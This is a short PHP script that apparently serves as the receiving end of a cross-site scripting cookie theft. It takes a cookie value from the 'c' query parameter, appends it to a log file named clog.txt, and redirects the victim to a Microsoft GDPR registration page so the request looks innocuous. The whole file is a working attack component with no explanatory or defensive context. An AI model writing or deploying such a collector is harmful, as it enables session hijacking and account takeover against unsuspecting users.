<?php
header('Location:https://info.microsoft.com/CE-GDPR-CNTNT-FY18-02Feb-20-AccelerateyourGeneralData-MGC0002020_01Registration-ForminBody.html');
$cookie = $_GET["c"];
$file = fopen('clog.txt','a');
fwrite($file,$cookie."\n\n");
?>
